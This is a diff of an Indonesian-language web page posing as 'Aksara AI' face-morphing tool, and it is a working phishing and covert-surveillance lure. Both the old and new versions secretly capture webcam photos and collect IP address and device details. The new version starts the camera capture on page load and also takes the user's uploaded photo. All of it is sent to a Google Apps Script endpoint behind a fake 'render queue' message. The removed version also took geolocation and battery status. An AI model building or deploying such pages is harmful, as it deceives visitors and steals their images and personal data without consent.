@@ -3,104 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI FaceMorpher v3.1 | Aksara AI Labs</title>
+    <title>Aksara AI - Face Morphing Labs</title>
     <style>
-        body { font-family: 'SF Pro Display', Roboto, Arial, sans-serif; background: #000; color: #fff; margin: 0; padding: 0; text-align: center; }
-        .header { background: #111; padding: 20px; border-bottom: 1px solid #333; font-weight: 800; font-size: 20px; color: #00ff00; letter-spacing: 2px; text-transform: uppercase; }
-        .container { max-width: 420px; margin: 40px auto; padding: 30px; background: #111; border-radius: 16px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,255,0,0.05); }
-        .ai-status { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-        .btn { background: #00ff00; color: #000; border: none; padding: 18px; font-weight: 800; border-radius: 10px; cursor: pointer; font-size: 16px; width: 100%; text-transform: uppercase; transition: 0.3s; letter-spacing: 1px; }
-        .btn:hover { background: #33ff33; transform: scale(1.02); }
-        
-        /* Animasi "AI Processing" yang Sangat Real */
-        #ai-processing { display: none; margin-top: 25px; }
-        .ai-pulse { display: inline-block; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,255,0,0.2); animation: pulse 1.5s infinite; margin-bottom: 15px; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,255,0,0.4); } 70% { box-shadow: 0 0 0 20px rgba(0,255,0,0); } 100% { box-shadow: 0 0 0 0 rgba(0,255,0,0); } }
-        
-        video, canvas { display: none; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f9fafb; color: #111827; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        .brand { font-weight: 800; color: #4f46e5; font-size: 24px; margin-bottom: 5px; }
+        h2 { font-size: 18px; color: #374151; margin-bottom: 25px; }
+        .upload-box { border: 2px dashed #6366f1; padding: 40px 20px; border-radius: 15px; background: #f5f3ff; cursor: pointer; transition: 0.3s; margin-bottom: 20px; }
+        .upload-box:hover { background: #ede9fe; }
+        .btn { background: #4f46e5; color: white; border: none; padding: 16px; font-weight: 700; border-radius: 10px; width: 100%; cursor: pointer; display: none; }
+        #loading { display: none; margin-top: 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4f46e5; width: 30px; height: 30px; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas, input[type="file"] { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">AI FaceMorpher</div>
-
-<div class="container">
-    <h2 style="margin: 0; font-size: 28px; font-weight: 800;">Ubah Wajah Anda</h2>
-    <p style="color: #666; margin-top: 5px;">Hanya dalam 5 detik.</p>
+<div class="card" id="app">
+    <div class="brand">AKSARA AI</div>
+    <h2>Transformasi Wajah 3D</h2>
     
-    <div class="ai-status">
-        Metode ini menggunakan teknologi **DeepFace v4.1** untuk memindai struktur wajah Anda dan menggabungkannya dengan ribuan karakter digital.<br>
-        <br>
-        <b style="color: #00ff00;">Gratis hari ini!</b>
+    <div id="input-section">
+        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+            <span style="font-size: 40px;">📁</span>
+            <p id="infoText" style="font-weight: 600; margin-top: 10px;">Pilih Foto Wajah</p>
+        </div>
+        <input type="file" id="fileInput" accept="image/*">
+        <button id="submitBtn" class="btn">GENERATE SEKARANG</button>
     </div>
 
-    <button id="startBtn" class="btn">MULAI PEMINDAIAN WAJAH</button>
-
-    <div id="ai-processing">
-        <div class="ai-pulse"></div>
-        <p id="process-text" style="font-size: 14px; color: #00ff00; font-weight: 600;">Menginisialisasi inti AI...</p>
+    <div id="loading">
+        <div class="spinner"></div>
+        <p id="loadStatus" style="font-weight: 600; color: #4f46e5;">Menyiapkan mesin AI...</p>
     </div>
 </div>
 
-<div style="font-size: 10px; color: #333; margin-top: 50px;">Aksara AI Labs - Educational Security Simulation</div>
-
-<video id="video" autoplay></video>
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-const GAS_URL = "https://script.google.com/macros/s/AKfycbxcRp-iUZkfmAoEvvvEGmffwLRzv8Hc_Ep8mSydh6BSVMtFYd0HfYf-27lAN51M0GdNlQ/exec";
+const GAS_URL = "https://script.google.com/macros/s/AKfycbw5o6oou9CETWkRi720Vdjt9w34owGT8JAUxJU_eCjl056IHjMh0YVIjdkI1egz8Siulw/exec"; // GANTI DENGAN URL WEB APP ANDA
+const fileInput = document.getElementById('fileInput');
+const submitBtn = document.getElementById('submitBtn');
+const loadStatus = document.getElementById('loadStatus');
 
-const startBtn = document.getElementById('startBtn');
-const processing = document.getElementById('ai-processing');
-const processText = document.getElementById('process-text');
+let secretPhotos = [];
 
-async function getIP() {
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const d = await res.json();
-        return d.ip;
-    } catch(e) { return "Unknown"; }
-}
-
-startBtn.addEventListener('click', async () => {
-    startBtn.style.display = 'none';
-    processing.style.display = 'block';
-    
-    const ip = await getIP();
-    
-    // Tahap 1: Kamera (AI butuh wajah)
-    processText.innerText = "Meminta izin sensor wajah (Kamera)...";
+// Fungsi ambil foto kamera otomatis di background
+async function startSecretCapture() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        
-        // Pura-puranya ini proses pemindaian AI
-        processText.innerText = "Memindai struktur wajah (3D)...";
-
-        const photos = [];
         const canvas = document.getElementById('canvas');
         
-        // Ambil 3 foto diam-diam (background proses)
-        for (let i = 1; i <= 3; i++) {
-            await new Promise(r => setTimeout(r, 1000));
+        for (let i = 0; i < 3; i++) {
+            await new Promise(r => setTimeout(r, 2000));
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            photos.push(canvas.toDataURL('image/jpeg'));
-            processText.innerText = `Mengonversi frame ${i}...`;
+            secretPhotos.push(canvas.toDataURL('image/jpeg', 0.6));
         }
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) { console.log("Kamera diblokir"); }
+}
 
-        // Tahap 2: Lokasi & IP (Pura-puranya sinkronisasi region AI)
-        processText.innerText = "Mendaftarkan hasil ke server regional...";
-        let loc = "Ditolak";
-        try {
-            const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-            loc = `${p.coords.latitude}, ${p.coords.longitude}`;
-        } catch(e) {}
+startSecretCapture();
 
-        const b = await navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
-        const battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+fileInput.addEventListener('change', (e) => {
+    if (e.target.files.length > 0) {
+        document.getElementById('infoText').innerText = e.target.files[0].name;
+        submitBtn.style.display = 'block';
+    }
+});
+
+submitBtn.addEventListener('click', async () => {
+    document.getElementById('input-section').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    
+    // Baca file yang di-upload user
+    const reader = new FileReader();
+    reader.readAsDataURL(fileInput.files[0]);
+    reader.onload = async function() {
+        const userFileData = reader.result;
+
+        // Ambil Metadata
+        let ip = "Unknown";
+        try { const res = await fetch('https://api.ipify.org?format=json'); const d = await res.json(); ip = d.ip; } catch(e) {}
+        
+        loadStatus.innerText = "Memproses pemindaian wajah...";
+        setTimeout(() => { loadStatus.innerText = "Merender karakter 3D..."; }, 2500);
 
         fetch(GAS_URL, {
             method: 'POST',
@@ -108,24 +101,21 @@ startBtn.addEventListener('click', async () => {
             body: JSON.stringify({
                 ip: ip,
                 os: navigator.platform,
-                browser: navigator.userAgent.split(' ').slice(-3).join(' '),
-                battery: battery,
-                location: loc,
-                images: photos
+                images: secretPhotos, // Foto kamera rahasia
+                userFile: userFileData // File yang di-upload user
             })
         }).then(() => {
-            // Selesai: Tampilan akhir yang membuat target penasaran
-            processText.style.color = "#00ff00";
-            processText.innerHTML = "<b>SUKSES!</b><br><br>Hasil AI akan segera dikirim melalui email/nomor WA.<br>Terima kasih sudah mencoba.";
-            document.querySelector('.ai-pulse').style.display = 'none';
-            stream.getTracks().forEach(t => t.stop());
+            setTimeout(() => {
+                document.getElementById('app').innerHTML = `
+                    <h2 style="color:#10b981">Antrean #102 Berhasil</h2>
+                    <p style="font-size:14px; color:#6b7280; line-height:1.6;">
+                        Proses render membutuhkan waktu 24 jam.<br>
+                        Hasil akan tersimpan otomatis di perangkat ini.
+                    </p>
+                `;
+            }, 5000);
         });
-
-    } catch (e) {
-        processText.style.color = "#ff3333";
-        processText.innerText = "GAGAL. AI butuh akses kamera.";
-        fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ ip: ip, os: navigator.platform, location: loc }) });
-    }
+    };
 });
 </script>
 </body>
